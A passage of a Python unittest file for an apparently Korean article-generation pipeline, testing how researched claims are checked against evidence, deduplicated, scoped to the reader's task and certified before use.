                patch.object(rewrite, "official_claim_authority_reason", return_value=None):
            pruned = rewrite.prune_deterministically_invalid_claims(
                research,
                source_documents,
                evidence_catalog,
            )
            errors = rewrite.validate_research(
                research,
                verify_links=False,
                source_documents=source_documents,
                evidence_catalog=evidence_catalog,
            )
        self.assertEqual(pruned["facts"], [])
        self.assertTrue(any("sources allowlist 밖 URL" in error for error in errors))

    def test_entailment_prompt_exposes_visible_task_and_rejects_same_repo_padding(self):
        research = {
            "primary_keyword": "Darknet convolutional output size",
            "reader_problem": "Darknet convolutional layer의 출력 크기와 CUDNN 제약을 확인한다",
            "reader_promise": "출력 크기 계산과 CUDNN 오류 조건을 구분한다",
            "popular_questions": [
                "출력 너비는 어떻게 계산하나요?",
                "CUDNN 버전 오류는 언제 나나요?",
                "패딩은 출력 크기에 어떤 영향을 주나요?",
            ],
            "sources": [],
            "facts": [],
            "limitations": [],
        }
        prompt = rewrite.fact_entailment_prompt(research, [])
        self.assertIn(research["reader_problem"], prompt)
        self.assertIn(research["reader_promise"], prompt)
        self.assertIn("같은 저장소·파일·제품", prompt)
        self.assertIn("binarize", prompt)
        self.assertIn("limitations 1개", prompt)

    def test_limitation_slot_requires_an_actual_boundary(self):
        self.assertIsNotNone(rewrite.limitation_boundary_rejection_reason(
            "Darknet은 GPL 라이선스로 공개됩니다"
        ))
        self.assertIsNotNone(rewrite.limitation_boundary_rejection_reason(
            "denormalize 함수는 weights 값을 복원합니다"
        ))
        self.assertIsNone(rewrite.limitation_boundary_rejection_reason(
            "`CUDNN` 7 미만에서는 초기화 오류가 발생합니다"
        ))
        self.assertIsNone(rewrite.limitation_boundary_rejection_reason(
            "GPL 라이선스는 재배포 시 소스 공개를 요구합니다"
        ))
        self.assertIsNone(rewrite.limitation_boundary_rejection_reason(
            "Slurm은 파일을 할당된 노드로 자동 이동시키지 않는다"
        ))
        self.assertIsNone(rewrite.limitation_boundary_rejection_reason(
            "많은 기능은 root 사용자만 실행할 수 있다"
        ))
        self.assertIsNone(rewrite.limitation_boundary_rejection_reason(
            "localhost는 호스트 머신이 아닌 컨테이너 내부를 가리킵니다"
        ))
        self.assertIsNone(rewrite.limitation_boundary_rejection_reason(
            "ngrok 웹후크는 프로덕션 구축에 적합하지 않다"
        ))

    def test_visible_task_side_axis_policy_is_narrow(self):
        output_task = {
            "primary_keyword": "Darknet convolutional output size",
            "reader_problem": "convolutional layer의 출력 크기를 계산한다",
            "reader_promise": "패딩과 stride 조건을 확인한다",
            "popular_questions": ["CUDNN 오류 조건은 무엇인가요?"],
        }
        self.assertIsNotNone(rewrite.visible_task_claim_rejection_reason(
            "Darknet은 GPL 라이선스로 공개됩니다",
            output_task,
        ))
        # 임의의 기능명은 어짜피 토큰 규칙으로 잘라내지 않고 독립 topic_fit에 맡긴다.
        self.assertIsNone(rewrite.visible_task_claim_rejection_reason(
            "binarize_weights 함수는 가중치 버퍼를 변환합니다",
            output_task,
        ))
        legal_task = {
            **output_task,
            "reader_problem": "Darknet을 상용 도입할 때 재배포 의무를 확인한다",
            "reader_promise": "GPL 라이선스의 법적 조건을 정리한다",
        }
        self.assertIsNone(rewrite.visible_task_claim_rejection_reason(
            "GPL 라이선스는 재배포 시 소스 공개를 요구합니다",
            legal_task,
        ))

    def test_research_task_scope_rejects_independent_axis_roundups(self):
        mixed_accelerator = {
            "primary_keyword": "가속기 프로그래밍",
            "reader_problem": "Slurm sbatch로 작업을 제출하고 CUDA GPU 메모리를 관리한다",
            "reader_promise": "squeue 조회와 Tegra 메모리 구조를 함께 설명한다",
            "popular_questions": [],
            "facts": [
                {"statement": "Slurm squeue로 작업 큐를 조회합니다"},
                {"statement": "Tegra 장치에서 cudaMemGetInfo로 DRAM을 확인합니다"},
            ],
            "limitations": [],
        }
        errors = rewrite.research_task_scope_errors(mixed_accelerator)
        self.assertTrue(any("Slurm 작업 관리" in error for error in errors), errors)

        mixed_product = {
            "primary_keyword": "Activepieces",
            "reader_problem": "플랜별 비용과 라이선스, Docker Compose 설치를 비교한다",
            "reader_promise": "MCP 연동까지 한 번에 안내한다",
            "popular_questions": [],
            "article_format": "comparison",
            "facts": [
                {"statement": "Activepieces 유료 플랜의 가격을 확인합니다"},
                {"statement": "다른 자동화 도구의 GPL 라이선스 의무를 확인합니다"},
                {"statement": "일반 서버에 Docker Compose로 설치합니다"},
                {"statement": "Activepieces MCP 연동을 설정합니다"},
            ],
            "limitations": [],
        }
        errors = rewrite.research_task_scope_errors(mixed_product)
        self.assertTrue(any("독립 축" in error for error in errors), errors)

        focused = {
            "primary_keyword": "Activepieces",
            "reader_problem": "Docker Compose 설치 후 MCP 연동 경로를 확인한다",
            "reader_promise": "한 셀프 호스팅 실행 과업을 끝낸다",
            "popular_questions": [],
            "facts": [
                {"statement": "Activepieces를 Docker Compose로 설치합니다"},
                {"statement": "Activepieces MCP 서버를 연결합니다"},
            ],
            "limitations": [],
        }
        self.assertEqual(rewrite.research_task_scope_errors(focused), [])

    def test_research_task_scope_allows_connected_gpu_scheduler_workflow(self):
        slurm_gpu = {
            "primary_keyword": "Slurm GPU 작업 제출",
            "reader_problem": "Slurm sbatch로 CUDA 작업을 제출한다",
            "reader_promise": "--gres=gpu로 GPU 자원을 요청하고 실행 상태를 확인한다",
            "popular_questions": [],
            "facts": [{
                "statement": "Slurm sbatch의 --gres=gpu 옵션은 GPU 자원을 요청합니다",
            }],
            "limitations": [],
        }
        self.assertEqual(rewrite.research_task_scope_errors(slurm_gpu), [])

        cuda_only = {
            "primary_keyword": "CUDA 배치 작업 GPU 메모리",
            "reader_problem": "CUDA 배치 작업의 GPU 메모리를 관리한다",
            "reader_promise": "cudaMemGetInfo로 가용 메모리를 확인한다",
            "popular_questions": [],
            "facts": [{
                "statement": "cudaMemGetInfo는 GPU의 가용 메모리를 반환합니다",
            }],
            "limitations": [],
        }
        self.assertEqual(rewrite.research_task_scope_errors(cuda_only), [])

        oom_diagnosis = {
            "primary_keyword": "Slurm CUDA OOM 진단",
            "reader_problem": "Slurm에서 CUDA 작업을 제출하고 GPU 메모리 부족을 진단한다",
            "reader_promise": "--gres=gpu 요청 후 cudaMemGetInfo로 가용 메모리를 점검한다",
            "popular_questions": [],
            "facts": [
                {"statement": "sbatch 명령의 --gres=gpu 옵션은 GPU 자원을 요청합니다"},
                {"statement": "cudaMemGetInfo 함수는 CUDA 작업의 가용 GPU 메모리를 반환합니다"},
            ],
            "limitations": [],
        }
        self.assertEqual(rewrite.research_task_scope_errors(oom_diagnosis), [])

    def test_research_task_scope_rejects_suffix_tokens_and_gpu_axis_padding(self):
        korean_suffix_mix = {
            "primary_keyword": "가속기",
            "reader_problem": "Slurm으로 작업을 제출하고 CUDA로 커널을 작성한다",
            "reader_promise": "squeue로 상태를 보고 cudaMemGetInfo로 메모리를 확인한다",
            "popular_questions": [],
            "facts": [
                {"statement": "squeue로 Slurm 작업 상태를 조회합니다"},
                {"statement": "cudaMemGetInfo로 CUDA 메모리를 확인합니다"},
            ],
            "limitations": [],
        }
        self.assertTrue(any(
            "Slurm 작업 관리" in error
            for error in rewrite.research_task_scope_errors(korean_suffix_mix)
        ))

        warp_padding = {
            "primary_keyword": "Slurm CUDA 작업 제출",
            "reader_problem": "Slurm에서 CUDA 작업을 제출한다",
            "reader_promise": "--gres=gpu로 자원을 요청하고 상태를 조회한다",
            "popular_questions": [],
            "facts": [
                {"statement": "sbatch --gres=gpu로 GPU 자원을 요청합니다"},
                {"statement": "CUDA warp는 32개 스레드를 함께 실행합니다"},
            ],
            "limitations": [],
        }
        self.assertTrue(any(
            "GPU 세부 축" in error
            for error in rewrite.research_task_scope_errors(warp_padding)
        ))

        bridge_laundering = {
            **warp_padding,
            "facts": [{
                "statement": "Slurm --gres=gpu 요청과 CUDA warp의 32개 스레드 실행을 설명합니다",
            }],
        }
        self.assertTrue(any(
            "GPU 세부 축" in error
            for error in rewrite.research_task_scope_errors(bridge_laundering)
        ))

        generic_gpu_request = {
            **warp_padding,
            "facts": [
                {"statement": "Slurm squeue로 작업을 조회합니다"},
                {"statement": "CUDA 런타임은 GPU 자원을 요청합니다"},
            ],
        }
        self.assertTrue(rewrite.research_task_scope_errors(generic_gpu_request))

        docker_gpu = {
            **warp_padding,
            "facts": [
                {"statement": "Slurm squeue로 작업을 조회합니다"},
                {"statement": "Docker run --gpus all로 CUDA 컨테이너를 실행합니다"},
            ],
        }
        self.assertTrue(rewrite.research_task_scope_errors(docker_gpu))

        direct_relation = {
            **warp_padding,
            "facts": [{
                "statement": "Slurm이 할당한 GPU에서 CUDA 작업을 실행합니다",
            }],
        }
        self.assertEqual(rewrite.research_task_scope_errors(direct_relation), [])

    def test_research_task_scope_fails_closed_on_three_commercial_axes(self):
        coherent = {
            "primary_keyword": "Activepieces 도입",
            "refreshed_topic": "Activepieces 상용 도입 판단",
            "reader_problem": "Activepieces 가격과 GPL 라이선스 의무, Docker 설치를 비교한다",
            "reader_promise": "Activepieces를 도입할지 한 번에 결정한다",
            "article_format": "decision_guide",
            "popular_questions": [],
            "facts": [
                {"statement": "Activepieces 유료 플랜의 가격을 확인합니다"},
                {"statement": "Activepieces GPL 라이선스의 재배포 의무를 확인합니다"},
                {"statement": "Activepieces를 Docker로 설치할 수 있습니다"},
            ],
            "limitations": [],
        }
        self.assertTrue(any(
            "최대 두 축" in error
            for error in rewrite.research_task_scope_errors(coherent)
        ))

    def test_commercial_scope_rejects_generic_entity_and_question_laundering(self):
        generic_entity = {
            "primary_keyword": "오픈소스 자동화 도구",
            "refreshed_topic": "오픈소스 자동화 도구 도입 비교",
            "reader_problem": "가격과 GPL 라이선스, Docker 설치를 비교한다",
            "reader_promise": "도입할 도구를 선택한다",
            "article_format": "decision_guide",
            "popular_questions": [],
            "facts": [
                {"statement": "자동화 도구 A의 유료 플랜 가격을 확인합니다"},
                {"statement": "자동화 도구 B의 GPL 라이선스 의무를 확인합니다"},
                {"statement": "자동화 도구 C를 Docker로 설치합니다"},
            ],
            "limitations": [],
        }
        self.assertTrue(any(
            "독립 축" in error
            for error in rewrite.research_task_scope_errors(generic_entity)
        ))

        question_laundering = {
            "primary_keyword": "자동화 도구 선택",
            "reader_problem": "업무 자동화 도구를 고른다",
            "reader_promise": "선택 기준을 확인한다",
            "article_format": "decision_guide",
            "popular_questions": [
                "A의 유료 플랜 가격은 얼마인가요?",
                "B의 GPL 라이선스 의무는 무엇인가요?",
                "C를 Docker로 설치하는 방법은 무엇인가요?",
            ],
            "facts": [
                {"statement": "A의 유료 플랜 가격은 월 10달러입니다"},
                {"statement": "B의 GPL 라이선스는 재배포 의무가 있습니다"},
                {"statement": "C는 Docker 설치 방법을 제공합니다"},
            ],
            "limitations": [],
        }
        self.assertTrue(any(
            "독립 축" in error
            for error in rewrite.research_task_scope_errors(question_laundering)
        ))

    def test_cross_evidence_text_duplicates_are_rejected_but_parallel_axes_survive(self):
        first = {
            "statement": "기본 설정에서 표준 출력과 표준 에러는 slurm-%j.out 파일에 저장됩니다",
            "source_urls": ["https://example.org/a"],
            "evidence_ids": ["S01Q001"],
        }
        duplicate = {
            "statement": "기본 설정에서 표준 출력과 표준 에러는 slurm-%j.out 이름의 파일로 전달됩니다",
            "source_urls": ["https://example.org/a"],
            "evidence_ids": ["S01Q002"],
        }
        self.assertTrue(rewrite.claims_are_textually_near_duplicates(first, duplicate))

        height = {"statement": "출력 높이는 패딩과 stride로 계산됩니다"}
        width = {"statement": "출력 너비는 패딩과 stride로 계산됩니다"}
        self.assertFalse(rewrite.claims_are_textually_near_duplicates(height, width))

        batch = {"statement": "실행 옵션은 `--norm batch`를 사용합니다"}
        instance = {"statement": "실행 옵션은 `--norm instance`를 사용합니다"}
        self.assertFalse(rewrite.claims_are_textually_near_duplicates(batch, instance))

        both_axes_first = {
            "statement": "출력 높이와 출력 너비는 패딩과 stride로 계산됩니다",
        }
        both_axes_second = {
            "statement": "출력 높이와 출력 너비는 패딩과 stride를 이용해 계산됩니다",
        }
        self.assertTrue(rewrite.claims_are_textually_near_duplicates(
            both_axes_first, both_axes_second,
        ))

    def test_duplicate_gate_preserves_polarity_values_versions_and_identifiers(self):
        distinct_pairs = [
            ("CUDA 기능을 지원합니다", "CUDA 기능을 지원하지 않습니다"),
            (
                "프로덕션 환경에서는 Docker 원격 배포 기능이 기본적으로 허용됩니다",
                "프로덕션 환경에서는 Docker 원격 배포 기능이 기본적으로 차단됩니다",
            ),
            ("Remote deployment is enabled", "Remote deployment is disabled"),
            ("Remote deployment is enabled입니다", "Remote deployment is disabled입니다"),
            ("This runtime does support CUDA", "This runtime doesn't support CUDA"),
            (
                "기본 설정에서 표준 출력은 slurm-%j.out 파일에 저장됩니다",
                "사용자 지정 설정에서 표준 출력은 slurm-%j.out 파일에 저장됩니다",
            ),
            (
                "cudaMemGetInfo 함수는 GPU의 사용 가능한 메모리를 반환합니다",
                "cudaMemGetInfo 함수는 GPU의 전체 메모리를 반환합니다",
            ),
            (
                "이 기능은 CUDA 환경에서 지원됩니다",
                "이 기능은 CUDA 12.1 환경에서 지원됩니다",
            ),
            (
                "convolutional_out_height 함수는 패딩과 stride를 적용합니다",
                "convolutional_out_width 함수는 패딩과 stride를 적용합니다",
            ),
            (
                "레이어에서 height는 패딩과 stride를 적용합니다",
                "레이어에서 width는 패딩과 stride를 적용합니다",
            ),
            (
                "긴 연산 단계에서는 CPU 메모리에서 버퍼를 읽고 결과를 계산합니다",
                "긴 연산 단계에서는 GPU 메모리에서 버퍼를 읽고 결과를 계산합니다",
            ),
        ]
        for first, second in distinct_pairs:
            with self.subTest(first=first, second=second):
                self.assertFalse(rewrite.claims_are_textually_near_duplicates(
                    {"statement": first}, {"statement": second},
                ))
                self.assertFalse(rewrite.claims_are_textually_near_duplicates(
                    {"statement": second}, {"statement": first},
                ))

    def test_duplicate_gate_does_not_erase_reversed_relations(self):
        reversed_relations = [
            ("클라이언트가 서버를 호출합니다", "서버가 클라이언트를 호출합니다"),
            (
                "CUDA는 OpenCL보다 실행 속도가 빠릅니다",
                "OpenCL은 CUDA보다 실행 속도가 빠릅니다",
            ),
            (
                "서버는 클라이언트에 요청을 전송합니다",
                "클라이언트는 서버에 요청을 전송합니다",
            ),
        ]
        for first, second in reversed_relations:
            with self.subTest(first=first):
                self.assertFalse(rewrite.claims_are_textually_near_duplicates(
                    {"statement": first}, {"statement": second},
                ))

    def test_duplicate_gate_catches_reordered_and_cross_source_paraphrases(self):
        self.assertTrue(rewrite.claims_are_textually_near_duplicates(
            {"statement": "기본 포트는 8080입니다"},
            {"statement": "8080이 기본 포트입니다"},
        ))
        self.assertTrue(rewrite.claims_are_textually_near_duplicates(
            {
                "statement": "기본 설정에서 표준 출력과 표준 에러는 `slurm-%j.out` 파일에 저장됩니다",
                "source_urls": ["https://docs.example.org/a"],
            },
            {
                "statement": "기본 설정에서 표준 출력과 표준 에러는 `slurm-%j.out` 이름의 파일로 전달됩니다",
                "source_urls": ["https://docs.example.org/b"],
            },
        ))
        self.assertFalse(rewrite.claims_can_be_pruned_as_duplicates(
            {
                "statement": "기본 설정에서 표준 출력과 표준 에러는 `slurm-%j.out` 파일에 저장됩니다",
                "source_urls": ["https://docs.example.org/a"],
            },
            {
                "statement": "기본 설정에서 표준 출력과 표준 에러는 `slurm-%j.out` 이름의 파일로 전달됩니다",
                "source_urls": ["https://docs.example.org/b"],
            },
        ))

    def test_final33_duplicate_pairs_are_detected_across_evidence_ids(self):
        source = "https://docs.example.org/guide"
        duplicate_pairs = [
            (
                "기본 설정에서 표준 출력과 표준 에러는 `slurm-%j.out` 파일에 저장됩니다.",
                "기본 설정에서 표준 출력과 표준 에러는 `slurm-%j.out` 이름의 파일로 전달됩니다.",
            ),
            (
                "Tegra 장치에서는 CPU와 iGPU가 동일한 SoC DRAM 메모리를 공유합니다.",
                "Tegra 장치에서 CPU와 iGPU는 동일한 SoC DRAM 메모리를 공유합니다.",
            ),
            (
                "`cudaHostRegister()` 함수는 I/O 일관성을 지원하는 플랫폼에서만 사용할 수 있습니다.",
                "`cudaHostRegister()` 함수는 I/O 일관성을 지원하는 플랫폼에서만 지원됩니다.",
            ),
            (
                "스크립트 내 첫 번째 비주석/비공백 줄에 도달한 이후의 `#SBATCH` 지시어는 처리되지 않습니다.",
                "스크립트 내 첫 번째 비주석 또는 비공백 줄에 도달한 이후의 `#SBATCH` 지시어는 처리되지 않습니다.",
            ),
        ]
        for index, (first, second) in enumerate(duplicate_pairs, 1):
            with self.subTest(index=index):
                self.assertTrue(rewrite.claims_are_textually_near_duplicates(
                    {
                        "statement": first,
                        "source_urls": [source],
                        "evidence_ids": [f"S01Q{index:03d}"],
                    },
                    {
                        "statement": second,
                        "source_urls": [source],
                        "evidence_ids": [f"S01Q{index + 10:03d}"],
                    },
                ))

    def test_prune_keeps_same_evidence_height_and_width_facts(self):
        source_url = "https://docs.example.org/convolution"
        evidence_text = (
            "convolutional_out_height 함수는 패딩과 stride를 사용해 출력 높이를 계산합니다. "
            "convolutional_out_width 함수는 패딩과 stride를 사용해 출력 너비를 계산합니다."
        )
        research = {
            "primary_keyword": "convolution output size",
            "reader_problem": "출력 높이와 너비를 계산한다",
            "reader_promise": "높이와 너비 공식을 구분한다",
            "popular_questions": [],
            "sources": [{
                "url": source_url,
                "title": "Convolution",
                "publisher": "Example",
                "tier": "official",
            }],
            "facts": [
                {
                    "statement": "convolutional_out_height 함수는 패딩과 stride를 사용해 출력 높이를 계산합니다",
                    "source_urls": [source_url],
                    "evidence_ids": ["S01Q001"],
                },
                {
                    "statement": "convolutional_out_width 함수는 패딩과 stride를 사용해 출력 너비를 계산합니다",
                    "source_urls": [source_url],
                    "evidence_ids": ["S01Q001"],
                },
            ],
            "limitations": [],
        }
        source_documents = [{
            "url": source_url,
            "title": "Convolution",
            "publisher": "Example",
            "content_excerpt": evidence_text,
            "outbound_urls": [],
        }]
        evidence_catalog = [{
            "id": "S01Q001", "url": source_url, "text": evidence_text,
        }]
        with patch.object(rewrite, "direct_source_rejection_reason", return_value=None), \
                patch.object(rewrite, "deterministic_source_rejection_reason", return_value=None), \
                patch.object(rewrite, "official_claim_authority_reason", return_value=None):
            pruned = rewrite.prune_deterministically_invalid_claims(
                research, source_documents, evidence_catalog,
            )
        self.assertEqual(len(pruned["facts"]), 2)

    def test_entailment_certificate_counts_only_strict_topic_fit_facts(self):
        source_url = "https://example.org/docs/darknet"
        facts = [
            {
                "id": f"F{index}",
                "statement": f"Darknet 출력 크기 확인 절차의 공식 단계 {index}입니다",
                "evidence_ids": [f"S01Q{index:03d}"],
            }
            for index in range(1, 9)
        ]
        limitation = {
            "id": "L1",
            "statement": "`CUDNN` 7 미만에서는 초기화 오류가 발생합니다",
            "evidence_ids": ["S01Q009"],
        }
        research = {
            "primary_keyword": "Darknet convolutional output size",
            "reader_problem": "Darknet 출력 크기와 CUDNN 제약을 확인한다",
            "reader_promise": "계산 절차와 오류 경계를 정리한다",
            "popular_questions": ["CUDNN 조건은 무엇인가요?"],
            "sources": [{"url": source_url, "tier": "official"}],
            "facts": facts,
            "limitations": [limitation],
        }
        evidence_catalog = [
            {"id": f"S01Q{index:03d}", "url": source_url, "text": "공식 원문 근거 " * 20}
            for index in range(1, 10)
        ]

        def claim_check(claim, topic_fit=True):
            return {
                "claim_id": claim["id"],
                "statement_sha256": rewrite.sha256_text(claim["statement"]),
                "atomicity": "atomic",
                "verdict": "entailed",
                "support_evidence_ids": claim["evidence_ids"],
                "scope": "match",
                "modality": "match",
                "polarity": "match",
                "conditions": "preserved",
                "temporal_version": "not_applicable",
                "authority_fit": True,
                "topic_fit": topic_fit,
                "inference": "none",
                "unsupported_clause": "",
                "reason": "원문 구간이 주장의 범위와 조건을 모두 직접 명시하는지 확인했습니다.",
            }

        verification = rewrite.clean_evidence_verification({
            "source_checks": [{
                "url": source_url,
                "accepted": True,
                "provenance_kind": "official_docs",
                "tier": "official",
                "publisher_identity": "Example",
                "reason": "Example 프로젝트가 직접 발행한 상세 기술 문서입니다.",
            }],
            "claim_checks": [
                claim_check(claim, topic_fit=index <= 6)
                for index, claim in enumerate(facts, 1)
            ] + [claim_check(limitation)],
        })
        errors = rewrite.validate_evidence_verification(
            verification,
            research,
            evidence_catalog,
        )
        self.assertTrue(any("엄격 검증 사실이 8개 미만: 6개" in error for error in errors))
        self.assertTrue(rewrite.evidence_verification_requires_research_revision(
            verification,
            research,
        ))
        retained = rewrite.retain_strictly_verified_claims(research, verification)
        self.assertEqual(len(retained["facts"]), 6)

        for check in verification["claim_checks"]:
            check["topic_fit"] = True
        self.assertEqual(
            rewrite.validate_evidence_verification(
                verification,
                research,
                evidence_catalog,
            ),
            [],
        )

    def test_host_rejects_license_padding_even_if_verifier_approves_it(self):
        source_url = "https://example.org/docs/darknet"
        research = {
            "primary_keyword": "Darknet convolutional output size",
            "reader_problem": "Darknet 출력 크기를 계산한다",
            "reader_promise": "패딩과 stride의 영향을 확인한다",
            "popular_questions": ["CUDNN 제약은 무엇인가요?"],
            "sources": [{"url": source_url, "tier": "official"}],
            "facts": [
                {
                    "id": f"F{index}",
                    "statement": (
                        "Darknet은 GPL 라이선스로 공개됩니다"
                        if index == 8
                        else f"Darknet 출력 크기 계산의 직접 근거 {index}입니다"
                    ),
                    "evidence_ids": [f"S01Q{index:03d}"],
                }
                for index in range(1, 9)
            ],
            "limitations": [],
        }

        def approved_check(claim):
            return {
                "claim_id": claim["id"],
                "statement_sha256": rewrite.sha256_text(claim["statement"]),
                "atomicity": "atomic",
                "verdict": "entailed",
                "support_evidence_ids": claim["evidence_ids"],
                "scope": "match",
                "modality": "match",
                "polarity": "match",
                "conditions": "preserved",
                "temporal_version": "not_applicable",
                "authority_fit": True,
                "topic_fit": True,
                "inference": "none",
                "unsupported_clause": "",
                "reason": "원문 구간이 주장의 범위와 조건을 모두 직접 명시하는지 확인했습니다.",
            }

        verification = rewrite.clean_evidence_verification({
            "source_checks": [{
                "url": source_url,
                "accepted": True,
                "provenance_kind": "official_docs",
                "tier": "official",
                "publisher_identity": "Example",
                "reason": "Example 프로젝트가 직접 발행한 상세 기술 문서입니다.",
            }],
            "claim_checks": [approved_check(claim) for claim in research["facts"]],
        })
        evidence_catalog = [
            {"id": f"S01Q{index:03d}", "url": source_url, "text": "공식 원문 근거 " * 20}
            for index in range(1, 9)
        ]
        errors = rewrite.validate_evidence_verification(
            verification,
            research,
            evidence_catalog,
        )
        self.assertTrue(any("F8 독자 과업 직접 적합성 실패" in error for error in errors))
        self.assertTrue(any("엄격 검증 사실이 8개 미만: 7개" in error for error in errors))
        retained = rewrite.retain_strictly_verified_claims(research, verification)
        self.assertEqual(len(retained["facts"]), 7)
        self.assertNotIn("라이선스", " ".join(
            claim["statement"] for claim in retained["facts"]
        ))
        self.assertTrue(rewrite.evidence_verification_requires_research_revision(
            verification,
            research,
        ))

    def test_entailment_certificate_requires_every_claim_and_direct_scope(self):
        evidence_catalog = [
            {"id": "S01Q001", "url": "https://example.org/docs/a", "text": "A" * 100},
            {"id": "S02Q001", "url": "https://example.net/docs/b", "text": "B" * 100},
        ]
        research = {
            "sources": [
                {"url": "https://example.org/docs/a", "tier": "official"},
                {"url": "https://example.net/docs/b", "tier": "official"},
            ],
            "facts": [{
                "id": "F1",
                "statement": "첫 번째 공식 기능은 지정된 입력을 처리합니다",
                "evidence_ids": ["S01Q001"],
            }],
            "limitations": [{
                "id": "L1",
                "statement": "두 번째 공식 기능에는 지정된 제한이 적용됩니다",
                "evidence_ids": ["S02Q001"],
            }],
        }

        def claim_check(claim_id, statement, evidence_id):
            return {
                "claim_id": claim_id,
                "statement_sha256": rewrite.sha256_text(statement),
                "atomicity": "atomic",
                "verdict": "entailed",
                "support_evidence_ids": [evidence_id],
                "scope": "match",
                "modality": "match",
                "polarity": "match",
                "conditions": "preserved",
                "temporal_version": "not_applicable",
                "authority_fit": True,
                "topic_fit": True,
                "inference": "none",
                "unsupported_clause": "",
                "reason": "해당 원문 구간이 문장의 범위와 조건을 빠짐없이 직접 명시합니다.",
            }

        certificate = rewrite.clean_evidence_verification({
            "source_checks": [
                {
                    "url": source["url"],
                    "accepted": True,
                    "provenance_kind": "official_docs",
                    "tier": "official",
                    "publisher_identity": "Example",
                    "reason": "프로젝트가 직접 발행한 구체적인 공식 문서 페이지입니다.",
                }
                for source in research["sources"]
            ],
            "claim_checks": [
                claim_check("F1", research["facts"][0]["statement"], "S01Q001"),
                claim_check("L1", research["limitations"][0]["statement"], "S02Q001"),
            ],
        })
        self.assertEqual(
            rewrite.validate_evidence_verification(certificate, research, evidence_catalog),
            [],
        )
        certificate["claim_checks"][0]["topic_fit"] = False
        errors = rewrite.validate_evidence_verification(certificate, research, evidence_catalog)
        self.assertTrue(any("검색 의도" in error for error in errors))
        self.assertTrue(
            rewrite.evidence_verification_requires_research_revision(certificate, research)
        )
        certificate["claim_checks"][0]["topic_fit"] = True
        certificate["source_checks"][0]["publisher_identity"] = ""
        errors = rewrite.validate_evidence_verification(certificate, research, evidence_catalog)
        self.assertTrue(any("publisher_identity" in error for error in errors))
        certificate["source_checks"][0]["publisher_identity"] = "Example"
        certificate["claim_checks"][0]["verdict"] = "partial"
        errors = rewrite.validate_evidence_verification(certificate, research, evidence_catalog)
        self.assertTrue(any("verdict 인증 실패" in error for error in errors))
        self.assertTrue(
            rewrite.evidence_verification_requires_research_revision(certificate, research)
        )
        certificate["claim_checks"] = certificate["claim_checks"][:1]
        errors = rewrite.validate_evidence_verification(certificate, research, evidence_catalog)
        self.assertTrue(any("ID 집합" in error for error in errors))
        self.assertIsNotNone(
            rewrite.provenance_rejection_reason(
                "https://github.com/example/project/issues/2257"
            )
        )

    def test_navigation_is_host_limited_to_nonassertive_title_and_heading(self):
        research = {
            "primary_keyword": "Darknet 설치",
            "secondary_keywords": ["Darknet 설정"],
            "facts": [{"id": "F1", "statement": "Darknet 설치 절차가 문서에 있습니다"}],
            "limitations": [{"id": "L1", "statement": "CUDNN 7 미만 조건이 적용됩니다"}],
        }
        self.assertTrue(rewrite.safe_navigation_unit(
            {"role": "heading", "text": "## Darknet 설치 전에 확인할 항목"},
            research,
        ))
        self.assertFalse(rewrite.safe_navigation_unit(
            {"role": "heading", "text": "## CUDNN 7 미만 오류와 한계"},
            research,
        ))
        self.assertFalse(rewrite.safe_navigation_unit(
            {"role": "title", "text": "Darknet이 항상 가장 빠른 이유"},
            research,
        ))
        self.assertFalse(rewrite.safe_navigation_unit(
            {"role": "body", "text": "Darknet 설치 전에 확인할 항목"},
            research,
        ))
        self.assertTrue(rewrite.safe_navigation_unit(
            {"role": "local_transition", "text": "Darknet 설치 명령어는 다음과 같습니다."},
            research,
        ))

        final_draft = {
            "title": "Darknet 설치 전에 확인할 항목",
            "description": "",
            "summary": "",
            "content": "",
            "faq": [],
        }
        unit = rewrite.build_draft_units(final_draft)[0]
        verification = rewrite.clean_verification({
            "approved": True,
            "reader_ready": True,
            "reader_issues": [],
            "unit_checks": [{
                "unit_id": unit["unit_id"],
                "verdict": "navigation",
                "support_ids": [],
                "clause_coverage": "not_applicable",
                "scope": "not_applicable",
                "modality": "not_applicable",
                "conditions": "not_applicable",
                "inference": "not_applicable",
                "reason": "외부 사실을 주장하지 않는 중립적인 설치 항목 제목입니다.",
            }],
        })
        self.assertEqual(rewrite.validate_verification(verification, research, final_draft), [])
        verification["unit_checks"][0]["support_ids"] = ["F1"]
        errors = rewrite.validate_verification(verification, research, final_draft)
        self.assertTrue(any("support_ids" in error for error in errors))

    def test_semantically_verified_claims_are_locked_across_repair_attempts(self):
        research = rewrite.clean_research({
            "sources": [{
                "url": "https://docs.example.org/guide", "title": "Guide",
                "publisher": "Example", "tier": "official",
            }],
            "facts": [
                {
                    "statement": "첫 번째 기능은 설정 파일을 읽습니다",
                    "source_urls": ["https://docs.example.org/guide"],
                    "evidence_ids": ["S01Q001"],
                },
                {
                    "statement": "두 번째 후보는 근거보다 범위가 넓습니다",
                    "source_urls": ["https://docs.example.org/guide"],
                    "evidence_ids": ["S01Q002"],
                },
            ],
            "limitations": [{
                "statement": "해당 옵션은 특정 환경에서만 적용됩니다",
                "source_urls": ["https://docs.example.org/guide"],
                "evidence_ids": ["S01Q003"],
            }],
        })

        def check(claim, *, valid=True):
            return {
                "claim_id": claim["id"],
                "statement_sha256": rewrite.sha256_text(claim["statement"]),
                "atomicity": "atomic",
                "verdict": "entailed" if valid else "unsupported",
                "support_evidence_ids": claim["evidence_ids"] if valid else [],
                "scope": "match" if valid else "unknown",
                "modality": "match" if valid else "unknown",
                "polarity": "match" if valid else "unknown",
                "conditions": "preserved" if valid else "unknown",
                "temporal_version": "not_applicable",
                "authority_fit": valid,
                "topic_fit": valid,
                "inference": "none" if valid else "assumption",
                "unsupported_clause": "" if valid else claim["statement"],
                "reason": "직접 원문이 모든 범위와 조건을 빠짐없이 명시하는지 대조했습니다.",
            }

        certificate = {"claim_checks": [
            check(research["facts"][0]),
            check(research["facts"][1], valid=False),
            check(research["limitations"][0]),
        ]}
        locked = rewrite.retain_strictly_verified_claims(research, certificate)
        self.assertEqual(
            [item["statement"] for item in locked["facts"]],
            ["첫 번째 기능은 설정 파일을 읽습니다"],
        )
        repaired = rewrite.clean_research({
            **research,
            "facts": [{
                "statement": "새 두 번째 기능은 상태 값을 반환합니다",
                "source_urls": ["https://docs.example.org/guide"],
                "evidence_ids": ["S01Q004"],
            }],
            "limitations": [],
        })
        merged = rewrite.merge_locked_research_claims(locked, repaired)
        statements = [item["statement"] for item in merged["facts"]]
        self.assertEqual(statements[0], "첫 번째 기능은 설정 파일을 읽습니다")
        self.assertIn("새 두 번째 기능은 상태 값을 반환합니다", statements)
        self.assertNotIn("두 번째 후보는 근거보다 범위가 넓습니다", statements)

